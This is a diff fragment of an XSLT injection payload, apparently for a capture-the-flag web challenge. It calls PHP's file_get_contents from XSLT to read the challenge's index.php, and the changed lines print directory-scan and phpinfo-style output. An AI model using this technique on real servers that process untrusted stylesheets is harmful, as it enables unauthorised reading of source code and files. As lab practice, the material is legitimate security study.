@@ -16,8 +16,8 @@ function test6(){return "hello world!";}
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
 <div style="background-color:teal;color:white;padding:4px">
 <span style="font-weight:bold">
- DIR2 implode:<xsl:value-of select="$strscand"/>     
- 
+ PHPINFO:<xsl:value-of select="$strscand"/>     
+ SCANDIR:<xsl:value-of select="@strscand[2]"/>
  DIR1 index.php:<xsl:value-of select="$header"/>   
 <xsl:value-of select="name"/>
 -
